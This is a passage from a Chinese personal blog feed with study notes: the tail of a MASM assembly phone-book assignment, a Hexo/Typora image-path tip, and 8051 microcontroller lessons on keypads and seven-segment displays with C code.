class="line">rep movsb</span><br><span class="line">call searchContact</span><br><span class="line"></span><br><span class="line">;把flag变回去</span><br><span class="line">lea edi ,offset sc_flag</span><br><span class="line">lea esi ,chooselist</span><br><span class="line">add esi ,0</span><br><span class="line">mov ecx ,1</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">push offset line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">jmp menu</span><br><span class="line"></span><br><span class="line">;添加临时数据</span><br><span class="line">c5:</span><br><span class="line">inc ebx</span><br><span class="line">call add_default_data</span><br><span class="line"></span><br><span class="line">push offset addtmp_success</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">push offset line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">jmp menu</span><br><span class="line"></span><br><span class="line">;退出程序</span><br><span class="line">c6:</span><br><span class="line">call ExitProcess</span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h2 id="遇到的问题及其解决方案"><a href="#遇到的问题及其解决方案" class="headerlink" title="遇到的问题及其解决方案"></a>遇到的问题及其解决方案</h2><h4 id="0X01-找不到msvcrt-inv文件"><a href="#0X01-找不到msvcrt-inv文件" class="headerlink" title="0X01 找不到msvcrt.inv文件"></a>0X01 找不到<code>msvcrt.inv</code>文件</h4><ol><li>下载<code>MASM SDK</code>文件（<a href="http://www.masm32.com/）" target="_blank" rel="external nofollow noopener noreferrer">http://www.masm32.com/）</a></li><li>安装，C盘装不上装其他盘也可以</li><li>在<code>masm32</code>文件夹下找到lib目录中找到<code>msvcrt.lib</code>文件，在include目录中找到<code>msvcrt.inc</code>文件，将它们复制到项目目录下</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://www.cnblogs.com/yangcs/p/5087490.html" target="_blank" rel="external nofollow noopener noreferrer">VS常见错误之一：error LNK2019: 无法解析的外部符号</a></p><p><a href="https://blog.csdn.net/u014399084/java/article/details/79679446" target="_blank" rel="external nofollow noopener noreferrer">安装masm32 问题：Delete Operation of EXE file has Failed!的解决办法</a></p><p><a href="[https://www.wuj1n9.cn/2020/04/20/%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0%E7%94%B5%E8%AF%9D%E6%9C%AC-Tips/](https://www.wuj1n9.cn/2020/04/20/汇编实现电话本-Tips/)">汇编实现电话本 Tips</a></p><p><a href="https://blog.csdn.net/jiangwei0512/article/details/50609083" target="_blank" rel="external nofollow noopener noreferrer">asm基础–汇编中的结构体</a></p><p><a href="https://blog.csdn.net/baoli1008/article/details/46691497" target="_blank" rel="external nofollow noopener noreferrer">汇编语言LEA和OFFSET的区别</a></p><p><a href="https://blog.csdn.net/zhenyongyuan123/article/details/8364011" target="_blank" rel="external nofollow noopener noreferrer">汇编语言：movsb/w/d</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;汇编作业–电话簿&quot;&gt;&lt;a href=&quot;#汇编作业–电话簿&quot; class=&quot;headerlink&quot; title=&quot;汇编作业–电话簿&quot;&gt;&lt;/a&gt;汇编作业–电话簿&lt;/h1&gt;&lt;p&gt;花了不少时间，不过总算完成这项作业了，虽然不是很完美，但也基本符合要求了，完成过程跟大家分享
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="汇编基础学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo联动Typora</title>
    <link href="http://kn0sky.com/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/hexo%E8%81%94%E5%8A%A8Typora/"/>
    <id>http://kn0sky.com/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/hexo%E8%81%94%E5%8A%A8Typora/</id>
    <published>2020-05-13T10:40:49.000Z</published>
    <updated>2020-05-13T11:07:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hexo联动Typora-插入图片"><a href="#hexo联动Typora-插入图片" class="headerlink" title="hexo联动Typora 插入图片"></a>hexo联动Typora 插入图片</h2><p>使用Typora这款软件来写作hexo博客的时候，经常遇到了一个烦人的问题，那就是插入图片的时候，hexo要用的图片路径和Typora写作用的图片路径不一样</p><p>有两条思路来解决这个问题</p><ol><li>将hexo和Typora存放图片的路径设置为相同的</li><li>改变hexo或者Typora读取图片的路径</li></ol><p>第一种方法网上很好搜到，就不说了，这里谈谈第二种方法</p><hr><p>我这里hexo设置了，hexo-post-asset，好像是这个名字，反正就是图片会从同文章名文件夹里读取</p><p>在每个文件的YAML里添加如下行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typora-root-url: 装图片的文件夹名</span><br></pre></td></tr></table></figure><p>然后文章内插入图片,例如：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可行：</span><br><span class="line">![<span class="string">image-20200513185515393</span>](<span class="link">image-20200513185515393.png</span>)</span><br><span class="line">不可行:</span><br><span class="line">![<span class="string">image-20200513185515393</span>](<span class="link">/image-20200513185515393.png</span>)</span><br></pre></td></tr></table></figure><p>如图：</p><p><img src="image-20200513185515393.png" alt="image-20200513185515393"></p><p>这样图片既可以在hexo直接显示，也可以在typora编辑器上看到</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;hexo联动Typora-插入图片&quot;&gt;&lt;a href=&quot;#hexo联动Typora-插入图片&quot; class=&quot;headerlink&quot; title=&quot;hexo联动Typora 插入图片&quot;&gt;&lt;/a&gt;hexo联动Typora 插入图片&lt;/h2&gt;&lt;p&gt;使用Typora这款
      
    
    </summary>
    
    
      <category term="折腾笔记" scheme="http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
    
      <category term="博客搭建" scheme="http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>51单片机入门03--按键</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A803--%E6%8C%89%E9%94%AE/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A803--%E6%8C%89%E9%94%AE/</id>
    <published>2020-05-13T05:27:19.000Z</published>
    <updated>2020-05-20T12:46:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="51单片机入门03–按键"><a href="#51单片机入门03–按键" class="headerlink" title="51单片机入门03–按键"></a>51单片机入门03–按键</h2><h3 id="键盘的原理"><a href="#键盘的原理" class="headerlink" title="键盘的原理"></a>键盘的原理</h3><p><img src="image-20200513133011891.png" alt="image-20200513133011891"></p><p>按键需要一个上拉电阻，当没有按下去的时候，由于上拉电阻，左边的端口是高电平，当按键闭合后，左边的端口会变成低电平</p><p>这里按下的瞬间存在一个电平抖动的问题，所以需要消除抖动：</p><ol><li>硬件消抖：锁存器</li><li>软件消抖：延时程序</li></ol><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>分为两类：</p><ol><li>独立式键盘<ul><li>每个按键占用一根并口线</li><li>用于键位较少的情况，处理简单</li></ul></li><li>矩阵键盘<ul><li>键位分布在行列交叉点上</li><li>占用并口少，键位越多越明显</li></ul></li></ol><p>后面将以示例介绍两种键盘</p><h4 id="键位的识别"><a href="#键位的识别" class="headerlink" title="键位的识别"></a>键位的识别</h4><p>对于独立式键盘：直接识别对应并口即可</p><p>对于矩阵键盘：</p><ol><li>先检测键盘上是否有键被按下</li><li>然后识别按下的是哪一个按键</li></ol><h3 id="示例：每次按下按键试数码管数字加一（独立键盘）"><a href="#示例：每次按下按键试数码管数字加一（独立键盘）" class="headerlink" title="示例：每次按下按键试数码管数字加一（独立键盘）"></a>示例：每次按下按键试数码管数字加一（独立键盘）</h3><p>原理图：</p><p><img src="image-20200513193902218.png" alt="image-20200513193902218"></p><blockquote><p>P1~P3自带上拉电阻，P0需要自己加上拉电阻</p></blockquote><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line">sbit key0=P0^<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> num=<span class="number">0</span>;flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序消抖</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(key0==<span class="number">0</span>&amp;&amp;flag==<span class="number">0</span>)&#123;<span class="comment">//判断按键是否按下</span></span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(key0==<span class="number">1</span>&amp;&amp;flag==<span class="number">1</span>)&#123;<span class="comment">//判断按键是否从按下状态中弹起，如果是，则实现功能</span></span><br><span class="line">num++;</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(num&gt;<span class="number">9</span>)num=<span class="number">0</span>;</span><br><span class="line">P2 = s[num];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">key();</span><br><span class="line">seg();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="示例：按下不同的按键显示不同的数字（矩阵键盘）"><a href="#示例：按下不同的按键显示不同的数字（矩阵键盘）" class="headerlink" title="示例：按下不同的按键显示不同的数字（矩阵键盘）"></a>示例：按下不同的按键显示不同的数字（矩阵键盘）</h3><p>原理图：</p><p><img src="image-20200513204000884.png" alt="image-20200513204000884"></p><p>如何判断按下的按键是哪个按键？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L3 L2 L1 L0 H3 H2 H1 H0  hex</span><br><span class="line">0  0  0  0  1  1  1  1   0x0f  默认情况</span><br><span class="line">0  0  0  0  1  1  1  0   0x0e  判断按下按键的行，H0</span><br><span class="line">1  1  1  1  0  0  0  0   0xf0  默认情况取反</span><br><span class="line">1  1  0  1  0  0  0  0   0xd0  判断按下按键的列，L1</span><br><span class="line">将第二行和第四行的值相加：0xde 即为(H0,L1)按键在P2中的值</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> num=<span class="number">99</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">120</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_scan</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=<span class="number">0</span>,tmp0=<span class="number">0</span>,tmp1=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断按下去的按键</span></span><br><span class="line">P1=<span class="number">0x0f</span>;</span><br><span class="line"><span class="keyword">if</span>(P1!=<span class="number">0x0f</span>)&#123;</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">20</span>);<span class="comment">//还是这样消除抖动最方便</span></span><br><span class="line">tmp0 = P1;</span><br><span class="line">P1=<span class="number">0xf0</span>;</span><br><span class="line"><span class="keyword">if</span>(P1!=<span class="number">0xf0</span>) tmp1 = P1;</span><br><span class="line">&#125;</span><br><span class="line">tmp = tmp1+tmp0;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现功能</span></span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="number">0xee</span>)num=<span class="number">0</span>; <span class="comment">//display 0</span></span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="number">0xde</span>)num=<span class="number">1</span>; <span class="comment">//display 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">P2=s[num];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">key_scan();</span><br><span class="line"><span class="built_in">display</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;51单片机入门03–按键&quot;&gt;&lt;a href=&quot;#51单片机入门03–按键&quot; class=&quot;headerlink&quot; title=&quot;51单片机入门03–按键&quot;&gt;&lt;/a&gt;51单片机入门03–按键&lt;/h2&gt;&lt;h3 id=&quot;键盘的原理&quot;&gt;&lt;a href=&quot;#键盘的原理&quot; c
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="51单片机学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>王道计组笔记01--计算机系统概述</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%8B%E9%81%93%E8%AE%A1%E7%BB%84%E4%B9%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%8B%E9%81%93%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B001--%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%8B%E9%81%93%E8%AE%A1%E7%BB%84%E4%B9%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%8B%E9%81%93%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B001--%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</id>
    <published>2020-05-13T02:17:33.000Z</published>
    <updated>2020-05-13T01:54:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="王道计组笔记01–计算机系统概述"><a href="#王道计组笔记01–计算机系统概述" class="headerlink" title="王道计组笔记01–计算机系统概述"></a>王道计组笔记01–计算机系统概述</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;王道计组笔记01–计算机系统概述&quot;&gt;&lt;a href=&quot;#王道计组笔记01–计算机系统概述&quot; class=&quot;headerlink&quot; title=&quot;王道计组笔记01–计算机系统概述&quot;&gt;&lt;/a&gt;王道计组笔记01–计算机系统概述&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="王道计组书学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%8B%E9%81%93%E8%AE%A1%E7%BB%84%E4%B9%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>51单片机入门02--数码管</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A802--%E6%95%B0%E7%A0%81%E7%AE%A1/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A802--%E6%95%B0%E7%A0%81%E7%AE%A1/</id>
    <published>2020-05-12T09:27:19.000Z</published>
    <updated>2020-05-20T12:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="51单片机入门02–数码管"><a href="#51单片机入门02–数码管" class="headerlink" title="51单片机入门02–数码管"></a>51单片机入门02–数码管</h2><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>Protues</li><li>Keil</li></ul><h2 id="数码管结构和原理"><a href="#数码管结构和原理" class="headerlink" title="数码管结构和原理"></a>数码管结构和原理</h2><p>原理图：</p><p><img src="image-20200512164114318.png" alt="image-20200512164114318"></p><p>不同字符对应16进制断码为：</p><p><img src="image-20200512164342327.png" alt="image-20200512164342327"></p><h2 id="数码管的显示方式"><a href="#数码管的显示方式" class="headerlink" title="数码管的显示方式"></a>数码管的显示方式</h2><p>显示方式分为静态显示和动态显示，其中：</p><ul><li><p>静态显示</p><ul><li>每个数码管的段选线与一组I/O接口线连接</li><li>每个数码管一直显示</li><li>公共端接地或电源</li></ul></li><li><p>动态显示</p><ul><li>所有数码管的段选线与一组I/O接口线并联</li><li>每个数码管的公共端由一根I/O线控制</li><li>显示为逐个显示</li></ul></li></ul><blockquote><p>只显示一位的话，那就不做区分了，因为都一样</p></blockquote><h2 id="示例1：循环显示0-9（静态显示）"><a href="#示例1：循环显示0-9（静态显示）" class="headerlink" title="示例1：循环显示0~9（静态显示）"></a>示例1：循环显示0~9（静态显示）</h2><h3 id="电路图及源码"><a href="#电路图及源码" class="headerlink" title="电路图及源码"></a>电路图及源码</h3><p><img src="image-20200512171852130.png" alt="image-20200512171852130"></p><p>代码如下：通过数组来控制依次显示的字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">120</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">P2 = s[i];</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">seg();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="示例2：用多位数码管显示selph字样（动态显示）"><a href="#示例2：用多位数码管显示selph字样（动态显示）" class="headerlink" title="示例2：用多位数码管显示selph字样（动态显示）"></a>示例2：用多位数码管显示selph字样（动态显示）</h2><p>电路图&amp;效果图如下：</p><p><img src="image-20200512173832213.png" alt="image-20200512173832213"></p><p>代码如下：通过一个数组来定义显示的字符，另一个数组来定义显示的顺序，从而实现动态显示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> anode[]=&#123;<span class="number">0x92</span>,<span class="number">0x86</span>,<span class="number">0xc7</span>,<span class="number">0x8c</span>,<span class="number">0x89</span>&#125;;<span class="comment">//SELPH</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> nu[]=&#123;<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">120</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        P3 = nu[i];<span class="comment">//P2和P3的顺序不能反，不然残留的内容会出问题</span></span><br><span class="line">P2 = anode[i];</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">10</span>);<span class="comment">//利用视觉残留产生同时显示多位不同的字符的效果</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">seg();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化版电路图&amp;效果图：</p><p><img src="image-20200512192750129.png" alt="image-20200512192750129"></p><p>这里使用74LS137译码器(74LS138也可以)进行译码操作（功能表及使用方法自行百度），通过P3.1-P3.3 的3个端口来表示全部8位的内容，有效节约了单片机的端口使用。</p><blockquote><p>这里使用的是共阴的数码管，如果使用共阳则需要在译码器的8个输出端口加一个反相器</p></blockquote><p>代码实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cathode[]=&#123;<span class="number">0x6d</span>,<span class="number">0x79</span>,<span class="number">0x38</span>,<span class="number">0x73</span>,<span class="number">0x76</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ym[]=&#123;<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 